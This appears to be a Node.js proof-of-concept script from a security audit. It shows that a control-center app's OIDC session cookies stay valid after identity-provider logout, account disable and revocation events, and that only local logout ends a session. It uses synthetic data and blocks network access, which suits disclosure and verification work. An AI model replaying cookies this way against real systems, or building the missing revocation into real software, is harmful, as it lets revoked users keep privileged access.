#!/usr/bin/env node

import assert from "node:assert/strict";
import crypto from "node:crypto";
import fs from "node:fs";
import path from "node:path";

const EXPECTED_HASHES = new Map([
  ["control-center/auth/oidc.mjs", "2f0c9ea5239935857caab3f233ff43cdb81a34d8ab77cfc1a7a00c2a1b7b91b1"],
  ["control-center/server.mjs", "0e660c3278ebe6d85c83e6852ef0afee6be10e7a434c3b37f0f33154969549b6"],
  ["control-center/migrations/001_auth_sessions.sql", "17cb06928a2316f55867606112363ef0b4ac1b1ef88484983ed8ba97187e27fb"],
  ["keycloak/import/platform-realm.json", "16de41ecdc12577ebd024849beb4a9e76edf79f86182c346e2451caf51671a9c"],
]);

const sourceRoot = path.resolve(process.argv[2] ?? "");
if (!process.argv[2] || !fs.statSync(sourceRoot, { throwIfNoEntry: false })?.isDirectory()) {
  throw new Error("usage: session-revocation-probe.mjs /path/to/archived/source");
}

function sha256(value) {
  return crypto.createHash("sha256").update(value).digest("hex");
}

function sha256File(filePath) {
  return sha256(fs.readFileSync(filePath));
}

for (const [relativePath, expected] of EXPECTED_HASHES) {
  assert.equal(sha256File(path.join(sourceRoot, relativePath)), expected, `${relativePath} is not the expected vulnerable source`);
}
console.log("[+] verified 4 embedded vulnerable-source hashes");

const oidcPath = path.join(sourceRoot, "control-center/auth/oidc.mjs");
const serverSource = fs.readFileSync(path.join(sourceRoot, "control-center/server.mjs"), "utf8");
const migrationSource = fs.readFileSync(path.join(sourceRoot, "control-center/migrations/001_auth_sessions.sql"), "utf8");
const realmSource = fs.readFileSync(path.join(sourceRoot, "keycloak/import/platform-realm.json"), "utf8");

assert.match(serverSource, /const session = await controlAuth\.authenticate\(req\)/);
assert.match(serverSource, /res\.setHeader\("set-cookie", await controlAuth\.logout\(req\)\)/);
assert.doesNotMatch(serverSource, /logout_token|backchannel[_ -]?logout/i);
assert.match(migrationSource, /\bsubject text not null\b/);
assert.match(migrationSource, /\boidc_session_id text not null default ''/);
assert.doesNotMatch(realmSource, /backchannel[_ .-]?logout/i);

let poolAttempts = 0;
let jwtVerifyAttempts = 0;
let networkAttempts = 0;
const { source: executableOidc, replacements } = stubUnexercisedImports(fs.readFileSync(oidcPath, "utf8"));
assert.deepEqual(replacements, { jose: 1, pg: 1 });

const originalFetch = globalThis.fetch;
globalThis.fetch = async () => {
  networkAttempts += 1;
  throw new Error("network access is forbidden in this proof");
};

const instrumentation = {
  poolAttempt() { poolAttempts += 1; },
  jwtVerifyAttempt() { jwtVerifyAttempts += 1; },
};
globalThis.__SESSION_REVOCATION_POC__ = instrumentation;

let auth;
try {
  const moduleUrl = `data:text/javascript;base64,${Buffer.from(executableOidc).toString("base64")}`;
  const { createControlCenterAuth } = await import(moduleUrl);
  auth = await createControlCenterAuth({ env: testEnvironment() });
  console.log("[+] loaded exact auth/session logic; unexercised OIDC and PostgreSQL imports are stubbed");

  assert.equal(typeof auth.handleBackchannelLogout, "undefined");
  assert.equal(typeof auth.store.revokeSessionsBySid, "undefined");
  assert.equal(typeof auth.store.revokeSessionsBySubject, "undefined");
  console.log("[+] revocation hooks backchannel=absent sid=absent subject=absent realm-backchannel=absent");

  const subject = "synthetic-owner-subject";
  const first = {
    token: "synthetic-cookie-session-a",
    csrf: "synthetic-csrf-a",
    sid: "synthetic-idp-sid-a",
  };
  const second = {
    token: "synthetic-cookie-session-b",
    csrf: "synthetic-csrf-b",
    sid: "synthetic-idp-sid-b",
  };
  await createLocalSession(auth, first, subject);
  await createLocalSession(auth, second, subject);

  const baseline = await replay(auth, first.token);
  assert.equal(baseline.ok, true);
  assert.equal(baseline.role, "owner");
  assert.equal(baseline.identity.subject, subject);
  assert.equal(baseline.identity.sessionId, first.sid);
  console.log(`[+] baseline cookie-a=accepted role=${baseline.role} sid=${baseline.identity.sessionId}`);

  const firstHash = sha256(first.token);
  const oldLastSeen = new Date(Date.now() - 120_000);
  auth.store.sessions.get(firstHash).lastSeenAt = oldLastSeen;

  syntheticProviderEvent("account-disable", `sub=${subject}`);
  const afterDisable = await replay(auth, first.token);
  assert.equal(afterDisable.ok, true);
  assert.ok(auth.store.sessions.get(firstHash).lastSeenAt.getTime() > oldLastSeen.getTime());
  console.log("[VULNERABLE] post-account-disable replay=cookie-a accepted idle-refresh=yes");

  syntheticProviderEvent("idp-session-logout", `sid=${first.sid}`);
  const afterIdpLogout = await replay(auth, first.token);
  assert.equal(afterIdpLogout.ok, true);
  console.log("[VULNERABLE] post-idp-session-logout replay=cookie-a accepted");

  syntheticProviderEvent("sid-revocation", `sid=${first.sid}`);
  const afterSidTarget = await replay(auth, first.token);
  const afterSidSibling = await replay(auth, second.token);
  assert.equal(afterSidTarget.ok, true);
  assert.equal(afterSidSibling.ok, true);
  console.log("[VULNERABLE] post-sid-revocation target=cookie-a accepted sibling=cookie-b accepted");

  syntheticProviderEvent("subject-wide-revocation", `sub=${subject}`);
  const afterSubjectFirst = await replay(auth, first.token);
  const afterSubjectSecond = await replay(auth, second.token);
  assert.equal(afterSubjectFirst.ok, true);
  assert.equal(afterSubjectSecond.ok, true);
  console.log("[VULNERABLE] post-subject-revocation cookie-a=accepted cookie-b=accepted");

  await auth.logout(requestWithCookie(first.token));
  const afterLocalLogoutFirst = await replay(auth, first.token);
  const afterLocalLogoutSecond = await replay(auth, second.token);
  assert.equal(afterLocalLogoutFirst.ok, false);
  assert.equal(afterLocalLogoutSecond.ok, true);
  console.log("[+] local-current-cookie-logout cookie-a=rejected cookie-b=accepted");

  assert.equal(networkAttempts, 0);
  assert.equal(poolAttempts, 0);
  assert.equal(jwtVerifyAttempts, 0);
  console.log("[+] provider-live operations=0 network=0 postgres=0 jwt-verification=0");
  console.log("[+] result=VULNERABLE");
} finally {
  if (auth) await auth.close();
  globalThis.fetch = originalFetch;
  delete globalThis.__SESSION_REVOCATION_POC__;
}

function stubUnexercisedImports(source) {
  const joseImport = 'import { createRemoteJWKSet, jwtVerify } from "jose";';
  const pgImport = 'import pg from "pg";';
  assert.equal(source.split(joseImport).length - 1, 1, "unexpected jose import shape");
  assert.equal(source.split(pgImport).length - 1, 1, "unexpected pg import shape");

  const joseStub = `
const createRemoteJWKSet = () => async () => { throw new Error("JWKS lookup is outside this proof"); };
const jwtVerify = async () => {
  globalThis.__SESSION_REVOCATION_POC__.jwtVerifyAttempt();
  throw new Error("JWT verification is outside this proof");
};`;
  const pgStub = `
const pg = { Pool: class {
  constructor() {
    globalThis.__SESSION_REVOCATION_POC__.poolAttempt();
    throw new Error("PostgreSQL is outside this proof");
  }
} };`;

  return {
    source: source.replace(joseImport, joseStub).replace(pgImport, pgStub),
    replacements: { jose: 1, pg: 1 },
  };
}

function testEnvironment() {
  return {
    NODE_ENV: "test",
    CONTROL_CENTER_ENV: "production",
    CONTROL_CENTER_BIND_HOST: "127.0.0.1",
    CONTROL_CENTER_AUTH_MODE: "oidc-passkey",
    CONTROL_CENTER_AUTH_STORE: "memory",
    CONTROL_CENTER_OIDC_ISSUER: "https://identity.example.test/realms/platform",
    CONTROL_CENTER_OIDC_AUTHORIZATION_ENDPOINT: "https://identity.example.test/realms/platform/protocol/openid-connect/auth",
    CONTROL_CENTER_OIDC_TOKEN_ENDPOINT: "http://127.0.0.1/token-not-contacted",
    CONTROL_CENTER_OIDC_JWKS_URI: "http://127.0.0.1/jwks-not-contacted",
    CONTROL_CENTER_OIDC_REDIRECT_URI: "https://portal.example.test/auth/callback",
    CONTROL_CENTER_OIDC_CLIENT_ID: "platform-control-center",
    CONTROL_CENTER_OIDC_REQUIRED_ACR: "urn:platform:loa:passkey",
    CONTROL_CENTER_OIDC_REQUIRED_AMR: "webauthn",
    CONTROL_CENTER_SESSION_MAX_AGE_SECONDS: "28800",
    CONTROL_CENTER_SESSION_IDLE_SECONDS: "1800",
    CONTROL_CENTER_SESSION_POLICY_VERSION: "1",
  };
}

async function createLocalSession(auth, fixture, subject) {
  await auth.store.createSession({
    tokenHash: sha256(fixture.token),
    csrfHash: sha256(fixture.csrf),
    policyVersion: auth.config.sessionPolicyVersion,
    subject,
    email: "owner@example.test",
    displayName: "Synthetic Owner",
    role: "owner",
    roles: ["owner"],
    acr: auth.config.requiredAcr,
    amr: ["webauthn"],
    authTime: new Date(Date.now() - 30_000),
    issuer: auth.config.issuer,
    sessionId: fixture.sid,
    keyId: "synthetic-key-id",
    expiresAt: new Date(Date.now() + 10 * 60_000),
  });
}

function requestWithCookie(token) {
  return {
    headers: {
      cookie: `__Host-platform_cc_session=${encodeURIComponent(token)}`,
    },
  };
}

async function replay(auth, token) {
  return auth.authenticate(requestWithCookie(token));
}

function syntheticProviderEvent(name, identity) {
  console.log(`[SYNTHETIC-IDP] ${name} ${identity} delivered-to-control-center=no`);
}
